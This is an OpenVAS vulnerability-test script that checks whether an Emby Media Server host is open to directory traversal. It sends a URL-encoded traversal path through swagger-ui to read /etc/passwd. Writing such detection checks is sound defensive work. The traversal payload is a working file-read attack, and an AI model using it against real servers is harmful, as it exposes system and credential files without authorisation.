###############################################################################
# OpenVAS Vulnerability Test
#
# Emby Media Server Directory Traversal Vulnerability (Linux)
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:emby:media";

if (description)
{
  script_version("2020-11-19T14:17:11+0000");
  script_oid("1.3.6.1.4.1.25623.1.0.107099");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2020-11-19 14:17:11 +0000 (Thu, 19 Nov 2020)");
  script_tag(name:"creation_date", value:"2017-05-03 11:37:14 +0530 (Wed, 03 May 2017)");

  script_name("Emby Media Server Directory Traversal Vulnerability (Linux)");

  script_tag(name:"summary", value:"This host is running Emby Media Server and is prone to a directory traversal vulnerability.");
  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");
  script_tag(name:"affected", value:"Emby Media Server 3.2.5 and prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read arbitrary files
  on the target system.");
  script_tag(name:"insight", value:"Input passed via the swagger-ui object in SwaggerService.cs is not properly
  verified before being used to load resources.");
  script_tag(name:"solution", value:"Emby has been notified in March 2017 about the vulnerability, shortly
  after they have released a new version that addresses these vulnerabilities. They however have not provided any
  version information or release notes that reflect this. Therefore update to the latest available version.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("gb_emby_media_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8096);
  script_mandatory_keys("emby_media_server/installed", "Host/runs_unixoide");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41948/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE)) exit( 0 );

url = "/%2femby%2fswagger-ui%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd";

if (http_vuln_check(port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
